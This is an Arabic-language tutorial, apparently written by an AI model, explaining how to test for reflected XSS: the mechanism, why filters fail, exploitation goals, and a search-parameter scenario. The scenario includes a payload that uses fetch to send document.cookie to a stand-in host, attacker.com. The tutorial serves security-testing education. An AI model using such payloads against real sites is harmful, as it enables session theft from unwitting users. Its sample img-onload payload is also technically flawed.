بناءً على طلبك لشرح **اختبار ثغرة XSS المنعكس (Test for Reflected XSS)** باستخدام نفس طريقة الشرح المقدمة (التي تتضمن أقسامًا مثل "ما المقصود؟"، "لماذا يعمل؟"، "كيف يتم الاستغلال؟"، والخطوات العملية)، سأقدم شرحًا مفصلاً ومنظمًا لهذه العملية في اختبار ثغرات Cross-Site Scripting (XSS). سأغطي جميع المحاولات الممكنة لاختبار ثغرة XSS المنعكس، مع التركيز على إدخال شيفرات JavaScript في نقاط إدخال (مثل معلمات URL، حقول النماذج، أو رؤوس HTTP) التي تُعرض مباشرة في استجابة الصفحة دون تنظيف كافٍ. سيتم تقسيم المحاولات إلى فئات (مثل حقن وسوم HTML، استخدام أحداث JavaScript، وتجاوز الفلاتر). سيتم تضمين المحتوى في علامة `<xaiArtifact>` كما هو مطلوب، مع معرف جديد لأن هذا طلب مستقل يركز على خطوة محددة. سأحافظ على الشرح باللغة العربية بأسلوب واضح ومنظم، متجنبًا تنسيق Markdown خارج العلامة بناءً على طلبك السابق.

---

## فهم الخطوة: اختبار ثغرة XSS المنعكس (Test for Reflected XSS)

### ما المقصود؟
اختبار ثغرة **XSS المنعكس (Reflected XSS)** هو عملية اختبار أمان لتحديد ما إذا كان التطبيق الإلكتروني عرضة لثغرة Cross-Site Scripting من النوع المنعكس، حيث يتم إدخال شيفرة JavaScript ضارة في نقطة إدخال (مثل معلمة URL، حقل نموذج، أو رأس HTTP) وتُعرض مباشرة في استجابة الصفحة دون تنظيف أو تصفية كافية. تُسمى "منعكسة" لأن الشيفرة الضارة تُرسل من المستخدم (عبر طلب HTTP) وتُنعكس (تُعرض) في استجابة الخادم. الهدف هو تنفيذ شيفرة JavaScript في متصفح الضحية لأغراض مثل سرقة البيانات، التلاعب بالصفحة، أو إعادة التوجيه.

### لماذا يعمل؟
- **عدم تنظيف الإدخال**: التطبيقات التي لا تُنظف أو تُصفي الإدخالات (مثل معلمات URL أو حقول النماذج) قد تُعرض الشيفرة الضارة مباشرة في HTML، مما يتيح تنفيذ JavaScript.
- **إدراج الإدخال في DOM**: إذا أُدرجت الإدخالات في استجابة HTML (مثل داخل `<div>`، `<input>`، أو JavaScript)، يمكن للمهاجم استخدام وسوم أو أحداث لتنفيذ شيفرة.
- **دعم المتصفحات لـ JavaScript**: المتصفحات تُنفذ JavaScript تلقائيًا عند إدراجه في وسوم مثل `<script>`، أحداث مثل `onload`، أو بروتوكولات مثل `javascript:`.
- **تجاوز الفلاتر البسيطة**: الفلاتر الضعيفة قد تحظر وسومًا مثل `<script>` ولكن تسمح بأحداث (`onerror`)، روابط (`javascript:`)، أو صيغ معقدة.
- **التفاعل مع المستخدم**: يمكن للمهاجم إقناع الضحية بالنقر على رابط يحتوي على الحقنة (مثل `https://example.com/?q=<script>alert('XSS')</script>`).

### كيف يتم الاستغلال؟
- يتم إدخال شيفرة JavaScript في نقطة إدخال (مثل معلمة URL أو حقل نموذج) يتم إرسالها إلى الخادم عبر طلب HTTP (GET أو POST).
- تُصمم الحقنة لتنفيذ شيفرة عند عرض الاستجابة في المتصفح، إما تلقائيًا (مثل `<script>` أو `<img onload>`) أو عند التفاعل (مثل النقر على رابط `javascript:`).
- تُستخدم الشيفرة لتنفيذ إجراءات ضارة مثل:
  - سرقة ملفات تعريف الارتباط (`document.cookie`).
  - استخراج محتوى الصفحة (`document.body.innerHTML`).
  - إعادة توجيه المستخدم إلى موقع ضار.
  - تتبع إدخالات المستخدم (مثل تسجيل كلمات المرور).
- يتم مراقبة خادم خارجي (للبيانات المسربة) أو استجابة المتصفح لتأكيد التنفيذ:
  - **نجاح (True)**: الشيفرة تُنفذ (مثل ظهور تنبيه أو إرسال بيانات إلى خادم المهاجم).
  - **فشل (False)**: لا يتم التنفيذ بسبب فلاتر، قيود CSP، أو تنظيف الإدخال.
- تُكيَّف الحقن لتجاوز الفلاتر (مثل استخدام صيغ بديلة أو تعتيم الشيفرة).

### السناريو
لنفترض أنك تختبر موقعًا إلكترونيًا يحتوي على شريط بحث يأخذ معلمة `q` من عنوان URL (مثل `https://example.com/search?q=test`). لاحظت أن قيمة `q` تُعرض مباشرة في الصفحة داخل `<div>Search results for: test</div>` دون تنظيف. حاولت إدخال `https://example.com/search?q=<script>alert('XSS')</script>` ولاحظت ظهور تنبيه عند تحميل الصفحة. تريد الآن استخدام حقنة مثل `https://example.com/search?q=<img src=x onload="fetch('http://attacker.com/log?c='+document.cookie)">` لاستخراج بيانات حساسة. إذا تلقى خادمك البيانات أو نُفذت الشيفرة، فهذا يؤكد وجود ثغرة XSS منعكس.

---
